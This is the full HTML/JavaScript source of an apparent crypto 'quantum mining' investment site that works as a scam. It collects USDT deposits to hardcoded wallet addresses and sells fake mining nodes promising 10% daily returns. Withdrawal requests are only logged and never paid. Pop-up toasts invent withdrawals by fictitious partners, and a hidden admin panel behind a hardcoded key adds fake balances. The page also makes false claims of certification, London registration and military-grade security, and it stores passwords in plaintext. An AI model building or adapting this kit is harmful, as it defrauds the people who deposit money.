<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NOVA | Institutional Quantum Mining</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root { --gold: #D4AF37; --dark: #0f172a; --accent: #4ade80; }
        body { background: #f8fafc; font-family: 'Plus Jakarta Sans', sans-serif; color: #1e293b; overflow-x: hidden; touch-action: manipulation; }
        .nova-card { background: white; border: 1px solid #e2e8f0; border-radius: 24px; box-shadow: 0 10px 25px rgba(0,0,0,0.02); overflow: hidden; transition: 0.3s; }
        .dark-card { background: var(--dark); color: white; border-radius: 28px; position: relative; overflow: hidden; border-bottom: 8px solid var(--gold); }
        .btn-gold { background: linear-gradient(135deg, #B8860B, #D4AF37); color: white; border-radius: 16px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; }
        .screen { display: none; animation: fadeIn 0.4s ease-out; padding-bottom: 120px; }
        .active-screen { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
        .nav-bar { position: fixed; bottom: 0; width: 100%; background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(10px); border-top: 1px solid #f1f5f9; display: flex; justify-content: space-around; padding: 15px; z-index: 1000; }
        .nav-item { color: #94a3b8; font-size: 10px; font-weight: 800; display: flex; flex-direction: column; align-items: center; gap: 5px; }
        .nav-item.active { color: var(--gold); }
        .p-input { background: #f1f5f9; border: 2px solid transparent; width: 100%; padding: 16px; border-radius: 14px; outline: none; margin-bottom: 12px; font-weight: 600; }
        .modal { display: none; position: fixed; inset: 0; background: white; z-index: 2000; padding: 25px; overflow-y: auto; }
        #trust-toast { position: fixed; bottom: 95px; left: 15px; right: 15px; background: var(--dark); color: white; padding: 15px; border-radius: 18px; display: none; z-index: 3000; border-left: 6px solid var(--gold); }
    </style>
</head>
<body>

    <div id="trust-toast">
        <div class="flex items-center gap-4">
            <div class="w-10 h-10 bg-green-500/20 rounded-full flex items-center justify-center"><i class="fa-solid fa-bolt text-green-500"></i></div>
            <div><p id="t-user" class="font-black text-[10px] uppercase"></p><p id="t-msg" class="text-slate-400 text-[9px]"></p></div>
        </div>
    </div>

    <div id="auth-screen" class="min-h-screen flex flex-col p-6 bg-white active-screen overflow-y-auto">
        <div class="text-center mt-10 mb-8">
            <h1 id="logo-tap" class="text-5xl font-black text-slate-900 tracking-tighter">NO<span class="text-[#D4AF37]">VA</span></h1>
            <div class="bg-yellow-50 text-yellow-700 text-[8px] font-bold px-3 py-1 rounded-full inline-block mt-2 tracking-widest">CERTIFIED ENTERPRISE V4.2</div>
        </div>

        <div class="mb-8">
            <h2 class="text-2xl font-black tracking-tight mb-2">Welcome to Nova <span class="text-[#D4AF37]">Infrastructure</span></h2>
            <p class="text-xs text-slate-500 leading-relaxed font-semibold">Join the world's most advanced liquid mining core. We provide institutional-grade hardware access for retail partners globally.</p>
        </div>

        <div class="space-y-3 mb-10">
            <input type="text" id="u-id" placeholder="Access Identifier (Username)" class="p-input">
            <input type="password" id="u-pw" placeholder="Security Passkey" class="p-input">
            <div id="adm-box" class="hidden"><input type="password" id="adm-key" placeholder="Root Admin Key" class="p-input border-yellow-500"></div>
            <button onclick="handleAuth()" class="w-full btn-gold py-5 shadow-xl shadow-yellow-600/20">Authorize Session</button>
            <p onclick="toggleMode()" id="mode-text" class="text-center text-[10px] text-slate-400 font-black uppercase mt-4 cursor-pointer tracking-widest">Request Registration</p>
        </div>

        <div class="space-y-6 pb-10">
            <div class="nova-card p-5 bg-slate-50 border-none">
                <h4 class="text-[10px] font-black text-slate-400 uppercase tracking-widest mb-3">System Integrity</h4>
                <div class="space-y-4">
                    <div class="flex items-start gap-4">
                        <i class="fa-solid fa-shield-check text-green-500 mt-1"></i>
                        <div><p class="text-[11px] font-bold">AES-256 Vault Encryption</p><p class="text-[9px] text-slate-400 font-semibold">Your assets are protected by military-grade security protocols.</p></div>
                    </div>
                    <div class="flex items-start gap-4">
                        <i class="fa-solid fa-microchip text-blue-500 mt-1"></i>
                        <div><p class="text-[11px] font-bold">Real-time Node Distribution</p><p class="text-[9px] text-slate-400 font-semibold">Instant hashrate allocation upon hardware activation.</p></div>
                    </div>
                </div>
            </div>
            <div class="text-center"><p class="text-[9px] text-slate-400 font-bold uppercase tracking-tighter">Registered in London, UK • Managed by Nova Digital LTD</p></div>
        </div>
    </div>

    <div id="app" class="hidden">
        <header class="p-5 flex justify-between items-center bg-white border-b sticky top-0 z-50">
            <h2 class="font-black text-2xl tracking-tighter">NO<span class="text-[#D4AF37]">VA</span></h2>
            <div id="user-tag" class="text-[8px] font-black bg-slate-900 text-white px-4 py-1.5 rounded-full tracking-widest uppercase">@PARTNER</div>
        </header>

        <div id="page-dash" class="screen active-screen px-4 pt-6">
            <div class="dark-card p-8 mb-6 shadow-2xl">
                <div class="relative z-10 text-center">
                    <p class="text-[9px] text-slate-400 font-black uppercase tracking-[5px] mb-3">Live Liquidity</p>
                    <h1 id="b-main" class="text-6xl font-black tracking-tighter mb-10">$0.00</h1>
                    <div class="grid grid-cols-2 gap-4 border-t border-white/10 pt-6">
                        <div class="text-left"><p class="text-[8px] text-slate-500 font-bold uppercase">Daily Yield</p><p id="b-daily" class="text-xl font-black text-green-400">+$0.00</p></div>
                        <div class="text-right"><p class="text-[8px] text-slate-500 font-bold uppercase">Net Profit</p><p id="b-total" class="text-xl font-black text-[#D4AF37]">$0.00</p></div>
                    </div>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-4 mb-8">
                <button onclick="openModal('modal-dep')" class="nova-card p-6 flex flex-col items-center gap-3"><i class="fa-solid fa-circle-plus text-3xl text-[#D4AF37]"></i><span class="text-[10px] font-black">DEPOSIT</span></button>
                <button onclick="openModal('modal-wd')" class="nova-card p-6 flex flex-col items-center gap-3"><i class="fa-solid fa-arrow-up-right-from-square text-3xl text-slate-400"></i><span class="text-[10px] font-black">WITHDRAW</span></button>
            </div>
        </div>

        <div id="page-nodes" class="screen px-4 pt-6"><div id="nodes-grid" class="space-y-4"></div></div>

        <div id="page-logs" class="screen px-4 pt-6"><div id="logs-list" class="space-y-3"></div></div>

        <nav class="nav-bar">
            <div onclick="nav('page-dash', this)" class="nav-item active"><i class="fa-solid fa-gauge-high text-xl"></i><span>CORE</span></div>
            <div onclick="nav('page-nodes', this)" class="nav-item"><i class="fa-solid fa-server text-xl"></i><span>NODES</span></div>
            <div onclick="nav('page-logs', this)" class="nav-item"><i class="fa-solid fa-list-check text-xl"></i><span>LOGS</span></div>
        </nav>
    </div>

    <div id="modal-dep" class="modal">
        <div class="flex justify-between items-center mb-8"><h2 class="text-2xl font-black italic">FUNDING GATEWAY</h2><i onclick="closeModal('modal-dep')" class="fa-solid fa-xmark text-2xl"></i></div>
        
        <div class="space-y-4 mb-8">
            <div class="nova-card p-5 border-l-4 border-blue-500 bg-blue-50/30">
                <div class="flex items-center gap-3 mb-3"><i class="fa-solid fa-shield-halved text-blue-500"></i><span class="text-xs font-black">TRUST WALLET GATEWAY</span></div>
                <p class="text-[9px] font-mono break-all font-bold text-slate-600 mb-2">0xb584fBe3d7f1A72AEb2A0a76b1bC959841eC0A37</p>
                <button onclick="copy('0xb584fBe3d7f1A72AEb2A0a76b1bC959841eC0A37')" class="text-[8px] font-black text-blue-600 uppercase tracking-widest">Copy Address</button>
            </div>

            <div class="nova-card p-5 border-l-4 border-orange-500 bg-orange-50/30">
                <div class="flex items-center gap-3 mb-3"><i class="fa-solid fa-headset text-orange-500"></i><span class="text-xs font-black">METAMASK GATEWAY</span></div>
                <p class="text-[9px] font-mono break-all font-bold text-slate-600 mb-2">0xc270914e5a9e72C5994fb4bd9BbdD9A3425303f2</p>
                <button onclick="copy('0xc270914e5a9e72C5994fb4bd9BbdD9A3425303f2')" class="text-[8px] font-black text-orange-600 uppercase tracking-widest">Copy Address</button>
            </div>
        </div>

        <input type="number" id="in-amt" placeholder="Amount (USDT)" class="p-input">
        <input type="text" id="in-ref" placeholder="Tx Hash / ID" class="p-input">
        <button onclick="submitFin('Deposit')" class="w-full btn-gold py-5">Confirm Deposit</button>
    </div>

    <div id="modal-wd" class="modal">
        <div class="flex justify-between items-center mb-8"><h2 class="text-2xl font-black italic">EXTRACT ASSETS</h2><i onclick="closeModal('modal-wd')" class="fa-solid fa-xmark text-2xl"></i></div>
        
        <p class="text-[10px] font-black text-slate-400 uppercase mb-4 tracking-widest">Select Extraction Method</p>
        <div class="grid grid-cols-2 gap-3 mb-6">
            <div onclick="selWd('Binance')" class="wd-opt border p-4 rounded-xl text-center active:bg-slate-100 cursor-pointer"><p class="text-[10px] font-black uppercase">Binance</p></div>
            <div onclick="selWd('OKX')" class="wd-opt border p-4 rounded-xl text-center active:bg-slate-100 cursor-pointer"><p class="text-[10px] font-black uppercase">OKX</p></div>
            <div onclick="selWd('Trust')" class="wd-opt border p-4 rounded-xl text-center active:bg-slate-100 cursor-pointer"><p class="text-[10px] font-black uppercase">Trust Wallet</p></div>
            <div onclick="selWd('Bybit')" class="wd-opt border p-4 rounded-xl text-center active:bg-slate-100 cursor-pointer"><p class="text-[10px] font-black uppercase">Bybit</p></div>
            <div onclick="selWd('Coinbase')" class="wd-opt border p-4 rounded-xl text-center active:bg-slate-100 cursor-pointer"><p class="text-[10px] font-black uppercase">Coinbase</p></div>
            <div onclick="selWd('Other')" class="wd-opt border p-4 rounded-xl text-center active:bg-slate-100 cursor-pointer"><p class="text-[10px] font-black uppercase">Web3 Wallet</p></div>
        </div>

        <input type="number" id="out-amt" placeholder="Amount (USDT)" class="p-input">
        <input type="text" id="out-addr" placeholder="Recipient Address" class="p-input">
        <button onclick="submitFin('Withdrawal')" class="w-full btn-gold py-5 bg-slate-900">Process Payout</button>
    </div>

    <div id="admin-panel" class="hidden fixed inset-0 bg-white z-[5000] p-6 overflow-y-auto">
        <div class="flex justify-between items-center mb-10"><h1 class="text-3xl font-black">ROOT ADMIN</h1><button onclick="closeAdmin()">EXIT</button></div>
        <div class="nova-card p-6">
            <input type="text" id="adm-target" placeholder="Target User" class="p-input">
            <input type="number" id="adm-val" placeholder="Amount" class="p-input">
            <button onclick="injectFunds()" class="w-full btn-gold py-4 bg-slate-900">Inject Funds</button>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, updateDoc, addDoc, collection, onSnapshot, query, where } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const config = { apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo", authDomain: "home-94d45.firebaseapp.com", projectId: "home-94d45", appId: "1:964390949419:web:589840cb91b7e42ecd506e" };
        const app = initializeApp(config); const db = getFirestore(app);
        let user = localStorage.getItem('nova_user'); let isLogin = true;

        if(user) start(user);

        window.handleAuth = async () => {
            const id = document.getElementById('u-id').value.toLowerCase().trim();
            const pw = document.getElementById('u-pw').value;
            if(document.getElementById('adm-key').value === "NOVA786") { openAdmin(); return; }
            if(!id || !pw) return alert("Required fields missing");

            const uR = doc(db, "users", id); const s = await getDoc(uR);
            if(!isLogin) {
                if(s.exists()) return alert("Username occupied");
                await setDoc(uR, { balance: 0, password: pw, daily: 0, total_profit: 0 });
                localStorage.setItem('nova_user', id); start(id);
            } else if(s.exists() && s.data().password === pw) {
                localStorage.setItem('nova_user', id); start(id);
            } else alert("Invalid Credentials");
        };

        function start(id) {
            user = id; document.getElementById('auth-screen').style.display='none'; document.getElementById('app').classList.remove('hidden');
            document.getElementById('user-tag').innerText = `@${id.toUpperCase()}`;
            onSnapshot(doc(db, "users", id), d => {
                const data = d.data();
                document.getElementById('b-main').innerText = "$" + (data.balance || 0).toFixed(2);
                document.getElementById('b-daily').innerText = "+$" + (data.daily || 0).toFixed(2);
                document.getElementById('b-total').innerText = "$" + (data.total_profit || 0).toFixed(2);
            });
            genNodes(); loadLogs(); setInterval(showToast, 20000);
        }

        window.selWd = (m) => { document.querySelectorAll('.wd-opt').forEach(o=>o.style.borderColor='#e2e8f0'); event.currentTarget.style.borderColor='#D4AF37'; window.selectedWd = m; };
        window.copy = (t) => { navigator.clipboard.writeText(t); alert("Address Copied!"); };

        function genNodes() {
            const c = document.getElementById('nodes-grid'); c.innerHTML = "";
            for(let i=1; i<=30; i++) {
                const cost = i * 40; const y = (cost * 0.1).toFixed(2);
                c.innerHTML += `<div class="nova-card flex items-center p-5 gap-4"><div class="w-16 h-16 bg-slate-900 rounded-2xl flex items-center justify-center text-white text-2xl"><i class="fa-solid fa-server"></i></div><div class="flex-1"><h4 class="text-xs font-black uppercase">Nova Gen-${i}</h4><p class="text-green-500 font-bold text-[9px]">+$${y}/Day</p></div><button onclick="buyNode(${cost},${y})" class="btn-gold px-4 py-2 text-[10px]">$${cost}</button></div>`;
            }
        }

        window.buyNode = async (p, d) => {
            const uR = doc(db, "users", user); const s = await getDoc(uR);
            if(s.data().balance < p) return alert("Liquidity Error");
            await updateDoc(uR, { balance: s.data().balance - p, daily: (s.data().daily || 0) + parseFloat(d) });
            alert("Hardware Activated!");
        };

        window.submitFin = async (type) => {
            const a = parseFloat(document.getElementById(type=='Deposit'?'in-amt':'out-amt').value);
            const r = document.getElementById(type=='Deposit'?'in-ref':'out-addr').value;
            if(!a || !r) return alert("Details missing");
            await addDoc(collection(db, "logs"), { user, type, amount: a, status: 'Processing', time: Date.now(), ref: r, method: window.selectedWd || 'None' });
            alert("Sent to Network Queue!"); closeModal(type=='Deposit'?'modal-dep':'modal-wd');
        };

        function loadLogs() {
            onSnapshot(query(collection(db, "logs"), where("user", "==", user)), s => {
                const c = document.getElementById('logs-list'); c.innerHTML = "";
                let entries = []; s.forEach(d => entries.push(d.data()));
                entries.sort((a,b) => b.time - a.time).forEach(l => {
                    c.innerHTML += `<div class="nova-card p-4 flex justify-between"><div><p class="text-[8px] font-black text-slate-400 uppercase">${l.type}</p><p class="text-xs font-bold">$${l.amount.toFixed(2)}</p></div><span class="text-[8px] font-black uppercase px-3 py-1 rounded-full ${l.status=='Success'?'bg-green-50 text-green-500':'bg-yellow-50 text-yellow-600'}">${l.status}</span></div>`;
                });
            });
        }

        function showToast() {
            const names = ["Zain", "Sara", "Ali", "Fatima", "Umer", "Khan", "Malik", "Arshad"];
            const u = names[Math.floor(Math.random()*names.length)];
            const val = (Math.random()*450 + 20).toFixed(2);
            document.getElementById('t-user').innerText = `Partner @${u}***`;
            document.getElementById('t-msg').innerText = `Withdrawn $${val} via Blockchain`;
            document.getElementById('trust-toast').style.display='block';
            setTimeout(()=> document.getElementById('trust-toast').style.display='none', 4500);
        }

        let taps = 0;
        document.getElementById('logo-tap').onclick = () => { taps++; if(taps >= 6) document.getElementById('adm-box').classList.remove('hidden'); };
        window.openAdmin = () => document.getElementById('admin-panel').classList.remove('hidden');
        window.closeAdmin = () => { document.getElementById('admin-panel').classList.add('hidden'); taps=0; document.getElementById('adm-box').classList.add('hidden'); };
        window.injectFunds = async () => {
            const t = document.getElementById('adm-target').value.toLowerCase().trim();
            const v = parseFloat(document.getElementById('adm-val').value);
            const uR = doc(db, "users", t); const s = await getDoc(uR);
            if(s.exists()) { await updateDoc(uR, { balance: s.data().balance + v }); alert("Injected!"); }
        };

        window.nav = (id, el) => {
            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active-screen'));
            document.getElementById(id).classList.add('active-screen');
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
            el.classList.add('active');
        };
        window.toggleMode = () => { isLogin = !isLogin; document.getElementById('mode-text').innerText = isLogin ? "Request Registration" : "Back to Partner Login"; };
        window.openModal = (id) => document.getElementById(id).style.display = 'block';
        window.closeModal = (id) => document.getElementById(id).style.display = 'none';
        window.logout = () => { localStorage.removeItem('nova_user'); location.reload(); };
    </script>
</body>
</html>
